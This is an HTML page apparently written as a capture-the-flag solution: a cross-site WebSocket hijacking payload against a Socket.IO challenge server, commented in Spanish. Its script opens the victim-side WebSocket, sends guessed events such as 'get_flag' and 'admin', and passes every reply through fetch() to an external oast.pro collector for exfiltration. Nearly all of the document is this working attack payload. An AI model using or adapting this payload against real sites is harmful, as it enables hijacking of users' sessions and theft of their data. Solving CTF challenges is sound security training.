<!DOCTYPE html>
<html>
<head>
    <title>WebSocket Exploit</title>
</head>
<body>
    <script>
        // Conecta al WebSocket del desafío
        websocket = new WebSocket('ws://k-newswire.task.sasc.tf:8000/socket.io/?EIO=4&transport=websocket');
        
        websocket.onopen = start;
        websocket.onmessage = handleReply;

        function start(event) {
            // Socket.IO usa un formato específico; envía mensaje inicial para activar comunicación
            websocket.send('40'); // Mensaje inicial típico de Socket.IO (EIO=4)
            websocket.send('42["READY"]'); // Envía "READY" en formato Socket.IO
            setTimeout(() => {
                websocket.send('42["get_flag"]'); // Intenta pedir la flag
                websocket.send('42["admin"]'); // Intenta un evento de admin
                websocket.send('42["flag"]');
                websocket.send('42["request_flag"]');
                websocket.send('42["send_flag"]');
                websocket.send('42["check_admin"]');
            }, 1000); // Espera 1 segundo para asegurar que la conexión esté lista
        }

        function handleReply(event) {
            // Exfiltra la respuesta (que debería incluir la flag) a tu servidor
            fetch('d2pvfr4gtqkr49rumv50g96k4ju4wr1bd.oast.pro/?data=' + encodeURIComponent(event.data), { mode: 'no-cors' });
        }
    </script>
</body>

</html>
